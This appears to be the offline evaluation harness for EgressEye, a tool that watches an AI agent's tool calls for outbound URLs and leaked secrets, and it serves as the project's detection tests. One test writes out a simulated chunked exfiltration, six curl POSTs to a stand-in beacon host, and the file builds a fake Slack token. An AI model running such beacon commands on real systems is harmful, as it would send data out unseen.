import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { processToolCall } from "../hooks/core.js";
import { summarizeSession, SessionSummary } from "../store/session.js";
import { Verdict } from "../engine/verdict.js";

/**
 * Offline eval: replays eval/scenarios.jsonl through the exact hook code path
 * with a fixture URLhaus feed, no network, and asserts expected verdicts and
 * secret findings. This doubles as the project's detection test suite and —
 * later — as a shared corpus others can adopt (see README).
 */

const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..");
const SCENARIOS = path.join(REPO_ROOT, "eval", "scenarios.jsonl");
const FIXTURE_FEED = path.join(REPO_ROOT, "eval", "fixtures", "urlhaus-sample.csv");

interface UrlExpectation {
  hostContains: string;
  verdict: Verdict;
}
interface Scenario {
  name: string;
  tool: string;
  input: unknown;
  expect?: {
    urls?: UrlExpectation[];
    secrets?: Array<{ id: string }>;
    noQuery?: boolean;
  };
}

function setEvalEnv(): void {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), "egress-eye-eval-"));
  process.env.EGRESS_EYE_HOME = home;
  process.env.EGRESS_EYE_OFFLINE = "1";
  process.env.EGRESS_EYE_RDAP = "0";
  process.env.EGRESS_EYE_ANNOUNCE = "0";
  process.env.EGRESS_EYE_FEED_FILE = FIXTURE_FEED;
  delete process.env.EGRESS_EYE_GSB_KEY;
  delete process.env.EGRESS_EYE_BLOCK;
}

const SPLIT_TOKEN = "xox" + 'b-123456789012-abcdefghijklmnop';
function substitutePlaceholders(s: string): string {
  return s.split("{{slack_token}}").join(SPLIT_TOKEN);
}

function loadScenarios(): Scenario[] {
  const lines = fs.readFileSync(SCENARIOS, "utf8").split("\n").filter((l) => l.trim() && !l.startsWith("#"));
  return lines.map((line, i) => {
    const parsed = JSON.parse(substitutePlaceholders(line)) as Scenario;
    if (!parsed.name) parsed.name = `scenario-${i}`;
    return parsed;
  });
}

interface CaseResult {
  name: string;
  passed: boolean;
  failures: string[];
}

async function runScenario(s: Scenario, sessionSuffix: string): Promise<CaseResult> {
  const failures: string[] = [];
  const sessionId = `eval-${sessionSuffix}`;
  const result = await processToolCall(
    { event: "pre-tool-use", tool: s.tool, input: s.input, sessionId },
    { persist: true },
  );

  const expect = s.expect ?? {};
  const urls = expect.urls;
  if (urls) {
    if (urls.length === 0) {
      if (result.judgements.length > 0) {
        failures.push(`expected no URLs, got: ${result.judgements.map((j) => `${j.url.url}→${j.verdict}`).join(", ")}`);
      }
    } else {
      for (const e of urls) {
        const match = result.judgements.find(
          (j) => (j.url.host.includes(e.hostContains) || j.url.url.includes(e.hostContains)) && j.verdict === e.verdict,
        );
        if (!match) {
          const got = result.judgements.filter((j) => j.url.host.includes(e.hostContains) || j.url.url.includes(e.hostContains));
          failures.push(
            got.length === 0
              ? `expected a URL matching '${e.hostContains}'`
              : `expected '${e.hostContains}' verdict ${e.verdict}, got ${got.map((j) => j.verdict).join("/")}`,
          );
        }
      }
    }
  }

  if (expect.secrets) {
    if (expect.secrets.length === 0) {
      if (result.secrets.length > 0) {
        failures.push(`expected no secrets, got: ${result.secrets.map((x) => x.id).join(", ")}`);
      }
    } else {
      for (const e of expect.secrets) {
        if (!result.secrets.some((x) => x.id === e.id)) {
          failures.push(`expected secret finding '${e.id}', got: ${result.secrets.map((x) => x.id).join(", ") || "none"}`);
        }
      }
    }
  }

  if (expect.noQuery) {
    for (const j of result.judgements) {
      if (j.url.url.includes("?") || j.url.url.includes("=")) {
        failures.push(`stored value for ${j.url.host} still contains a query string: ${j.url.url}`);
      }
    }
  }

  return { name: s.name, passed: failures.length === 0, failures };
}

async function runShardedAggregation(): Promise<CaseResult> {
  const failures: string[] = [];
  const sessionId = "eval-sharded";
  for (let i = 0; i < 6; i++) {
    await processToolCall(
      {
        event: "pre-tool-use",
        tool: "Bash",
        input: { command: `curl -X POST --data "chunk=${i}" https://telemetry-ingest-9d3.example/beacon` },
        sessionId,
      },
      { persist: true },
    );
  }
  const summary: SessionSummary = summarizeSession(sessionId);
  if (summary.urlUnique < 1) failures.push("sharded scenario recorded no URLs");
  if (summary.aggregates.length === 0) {
    failures.push("expected a repeated-egress aggregate for 6× contacts with the same unknown host");
  }
  return { name: "sharded-egress-aggregation", passed: failures.length === 0, failures };
}

async function main(): Promise<void> {
  setEvalEnv();
  const scenarios = loadScenarios();
  process.stdout.write(`EgressEye eval — ${scenarios.length} scenarios, offline fixture feed\n\n`);

  const results: CaseResult[] = [];
  let i = 0;
  for (const s of scenarios) {
    results.push(await runScenario(s, String(i++)));
  }
  results.push(await runShardedAggregation());

  let passed = 0;
  for (const r of results) {
    if (r.passed) {
      passed++;
      process.stdout.write(`  ✓ ${r.name}\n`);
    } else {
      process.stdout.write(`  ✗ ${r.name}\n`);
      for (const f of r.failures) process.stdout.write(`      ${f}\n`);
    }
  }

  process.stdout.write(`\n${passed}/${results.length} scenarios passed.\n`);
  if (passed < results.length) process.exit(1);
}

main().catch((err: unknown) => {
  process.stderr.write(`eval failed: ${err instanceof Error ? err.stack : String(err)}\n`);
  process.exit(1);
});
